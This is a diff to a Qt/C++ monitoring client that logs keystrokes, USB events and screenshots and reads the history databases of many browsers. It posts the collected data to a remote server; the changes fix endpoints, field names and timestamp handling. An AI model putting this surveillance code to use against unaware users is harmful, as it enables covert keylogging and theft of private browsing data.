@@ -26,16 +26,22 @@
 #include <QtSql/QSqlDatabase>
 #include <QtSql/QSqlQuery>
 #include <QtSql/QSqlError>
+#include <QtSql/QSqlRecord>
 
 #include <QtNetwork/QNetworkInterface>
 
 // #include "utils/desktopinfo.h"
 #include "MonitorClient.h"
+#include "ConfigDialog.h"
 #include "functions.h"
-#include "KeyboardMonitor.h"
 #include "version.h"
+#include "ConfigDialog.h"
 #include <libudev.h>
+#include <qarraydata.h>
+#include <qchar.h>
 #include <qdatetime.h>
+#include <qglobal.h>
+#include <qjsonobject.h>
 
 #define TIC_INTERVAL 30
 #define HISTORY_INTERVAL 120
@@ -202,7 +208,9 @@ void MonitorClient::processUsbEvent(struct udev_device* dev)
         usbDeviceInfo[syspath] = deviceInfo;  // Store device info
         QJsonObject entryObj;
         entryObj["date"] = timestamp;
-        entryObj["device"] = "Connected: " + deviceInfo;
+        entryObj["device_name"] = "Connected: " + deviceInfo;
+        entryObj["action"] = "Nothing";  // Indicate this is a connection event
+
         usbLogs.append(entryObj);
         emit usbEvent();
     } else if (strcmp(action, "remove") == 0) {
@@ -210,7 +218,9 @@ void MonitorClient::processUsbEvent(struct udev_device* dev)
         usbDeviceInfo.remove(syspath);  // Remove from map
         QJsonObject entryObj;
         entryObj["date"] = timestamp;
-        entryObj["device"] = "Disconnected: " + deviceInfo;
+        entryObj["device_name"] = "Disconnected: " + deviceInfo;
+        entryObj["action"] = "Nothing";  // Indicate this is a connection event
+
         usbLogs.append(entryObj);
         emit usbEvent();
     }
@@ -227,7 +237,7 @@ void MonitorClient::handleUsbEvent()
     }
 }
 
-void MonitorClient::handleKeyPress(qint64 timestamp, const QString &windowTitle, const QString &keyText)
+void MonitorClient::handleKeyPress(QString timestamp, const QString &windowTitle, const QString &keyText)
 {
     QJsonObject entryObj;
     entryObj["date"] = timestamp;
@@ -314,7 +324,7 @@ int MonitorClient::sendScreens(QString filePath){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi___.php").arg(serverIP).arg(serverPort)));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/webapi.php").arg(serverIP).arg(serverPort)));
         QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         QHttpPart imagePart;
@@ -376,7 +386,7 @@ int MonitorClient::sendTic(){
         QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
         // the HTTP request
-        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort)));
+        QNetworkRequest req(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
         // QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
         // QHttpPart eventPart;
@@ -407,7 +417,7 @@ int MonitorClient::sendTic(){
         QJsonDocument doc(pingData);
         QByteArray data = doc.toJson();
         
-        QNetworkRequest request(QUrl(QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort)));
+        QNetworkRequest request(QUrl(QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort)));
         request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
         
         qDebug() << "Request Content-Type:" << request.header(QNetworkRequest::ContentTypeHeader);
@@ -482,18 +492,66 @@ void MonitorClient::queryBrowserHistory(const QString& dbPath, const QString& qu
             // Get the last check time from server
             qint64 lastCheck = getLastCheckedTime(browserName);
             QString fieldNameForVisitTime = getFieldNameForVisitTime(browserName);
-            QString fullQuery = query + QString(" AND %1 > %2").arg(fieldNameForVisitTime).arg(lastCheck) + QString(" ORDER BY %1 ASC").arg(fieldNameForVisitTime);
+
+            // Build the query with correct WHERE/AND logic
+            QString fullQuery = query.trimmed();
+            QString condition = QString("%1 > %2").arg(fieldNameForVisitTime).arg(lastCheck);
+
+            // Remove trailing ORDER BY if present
+            QRegExp orderByRegex("\\bORDER\\s+BY\\b.*$", Qt::CaseInsensitive);
+            QString orderByClause;
+            int orderByPos = orderByRegex.indexIn(fullQuery);
+            if (orderByPos != -1) {
+                orderByClause = fullQuery.mid(orderByPos);
+                fullQuery = fullQuery.left(orderByPos).trimmed();
+            }
+
+            // Add WHERE/AND condition
+            if (fullQuery.contains(QRegExp("\\bWHERE\\b", Qt::CaseInsensitive))) {
+                fullQuery += " AND " + condition;
+            } else {
+                fullQuery += " WHERE " + condition;
+            }
+
+            // Re-append ORDER BY if it was present
+            if (!orderByClause.isEmpty()) {
+                fullQuery += " " + orderByClause;
+            } else {
+                // Only add ORDER BY if not already present
+                if (!fullQuery.contains(QRegExp("\\bORDER\\s+BY\\b", Qt::CaseInsensitive))) {
+                    fullQuery += QString(" ORDER BY %1 ASC").arg(fieldNameForVisitTime);
+                }
+            }
+
             if (sqlQuery.exec(fullQuery)) {
                 while (sqlQuery.next()) {
-                    qint64 visitTime = sqlQuery.value("visit_time").toLongLong();
-                    QString url = sqlQuery.value("urls.url").toString();
-                    QString title = sqlQuery.value("title").toString();
+                    // Get visit_time as qint64 (may be microseconds or milliseconds depending on browser)
+                    qint64 visitTime = sqlQuery.record().value("visit_time").toLongLong();
+                    QDateTime dt;
+
+                    // Convert visitTime to real time depending on browser
+                    if (browserName == "Firefox" || browserName == "Midori") {
+                        // Firefox/Midori: visit_time is in microseconds since epoch
+                        dt = QDateTime::fromMSecsSinceEpoch(visitTime / 1000);
+                    } else if (browserName == "Falkon") {
+                        // Falkon: visit_time is in milliseconds since epoch
+                        dt = QDateTime::fromMSecsSinceEpoch(visitTime);
+                    } else {
+                        // Chromium-based: visit_time is microseconds since 1601-01-01
+                        // Convert to Unix epoch
+                        qint64 unixTime = (visitTime / 1000000) - 11644473600LL;
+                        dt = QDateTime::fromSecsSinceEpoch(unixTime);
+                    }
+
+                    QString url = sqlQuery.record().indexOf("url") != -1 ? sqlQuery.record().value("url").toString() : QString();
+                    QString title = sqlQuery.record().indexOf("title") != -1 ? sqlQuery.record().value("title").toString() : QString();
                     QJsonObject historyItem;
-                    historyItem["date"] = QDateTime(sqlQuery.value("visit_time")).toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
+                    historyItem["date"] = dt.toString("yyyy-MM-dd HH:mm:ss");
                     historyItem["browser"] = browserName;
                     historyItem["url"] = url;
-                    historyItem["title"] = title;
-                    // historyItem["last_visit"] = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
+                    if (!title.isEmpty()) {
+                        historyItem["title"] = title;
+                    }
                     browserHistories.append(historyItem);
                     if (lastCheck < visitTime) {
                         lastCheck = visitTime;
@@ -599,8 +657,10 @@ void MonitorClient::getFirefoxHistory() {
     qDebug() << "Firefox history path:" << profilePaths;
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_date/1000000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
-                           "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ";
+            // This query will extract url, title, and visit_time (microseconds since epoch)
+            QString query =
+                "SELECT p.url AS url, p.title AS title, h.visit_date AS visit_time "
+                "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id";
             queryBrowserHistory(dbPath, query, "Firefox");
         }
     }
@@ -612,7 +672,7 @@ void MonitorClient::getChromeHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Chrome");
         }
@@ -625,7 +685,7 @@ void MonitorClient::getEdgeHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Edge");
         }
@@ -638,7 +698,7 @@ void MonitorClient::getOperaHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Opera");
         }
@@ -651,7 +711,7 @@ void MonitorClient::getBraveHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, title, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, urls.title AS title, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Brave");
         }
@@ -664,7 +724,7 @@ void MonitorClient::getMidoriHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_date/1000000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
+            QString query = "SELECT datetime(visit_date/1000, 'unixepoch', '+10:00') as last_visit_time, p.url, h.visit_date as visit_time "
                            "FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ";
             queryBrowserHistory(dbPath, query, "Midori");
         }
@@ -677,7 +737,7 @@ void MonitorClient::getYandexHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url as url, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Yandex");
         }
@@ -690,7 +750,7 @@ void MonitorClient::getSlimjetHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url as url, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Slimjet");
         }
@@ -841,7 +901,8 @@ void MonitorClient::getStorageDevices()
                     QString timestamp = QDateTime::currentDateTime().toTimeZone(QTimeZone("Asia/Vladivostok")).toString("yyyy-MM-dd HH:mm:ss");
                     QJsonObject entryObj;
                     entryObj["date"] = timestamp;
-                    entryObj["device"] = "Connected: " + deviceInfo;
+                    entryObj["device_name"] = "Connected: " + deviceInfo;
+                    entryObj["action"] = "Nothing";  // Indicate this is a connection event
                     qDebug() << "Connected: " + deviceInfo;
                     usbLogs.append(entryObj);
                 }
@@ -1035,7 +1096,7 @@ void MonitorClient::getVivaldiHistory() {
     
     for (const QString& dbPath : profilePaths) {
         if (!dbPath.isEmpty()) {
-            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time "
+            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, visit_time "
                            "FROM urls, visits WHERE visits.url = urls.id";
             queryBrowserHistory(dbPath, query, "Vivaldi");
         }
@@ -1059,7 +1120,7 @@ int MonitorClient::sendDataChunk(const QString& serverIP, int serverPort, const 
     QNetworkAccessManager mgr;
     QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));
 
-    QString url = QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort);
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
     QNetworkRequest req;
     req.setUrl(QUrl(url));
     req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
@@ -1115,7 +1176,7 @@ bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
 {
     qDebug() << "=== Testing API Endpoints ===";
     
-    QStringList endpoints = {"/eventhandler___.php", "/webapi.php"};
+    QStringList endpoints = {"/eventhandler.php", "/webapi.php"};
     
     for (const QString& endpoint : endpoints) {
         QString url = QString("http://%1:%2%3").arg(serverIP).arg(serverPort).arg(endpoint);
@@ -1310,7 +1371,7 @@ bool MonitorClient::testServerConnection()
 {
     QString serverIP = getServerIP();
     int serverPort = getServerPort();
-    QString url = QString("http://%1:%2/eventhandler___.php").arg(serverIP).arg(serverPort);
+    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
     
     qDebug() << "Testing server connection to:" << url;
     qDebug() << "Server IP:" << serverIP << "Port:" << serverPort;
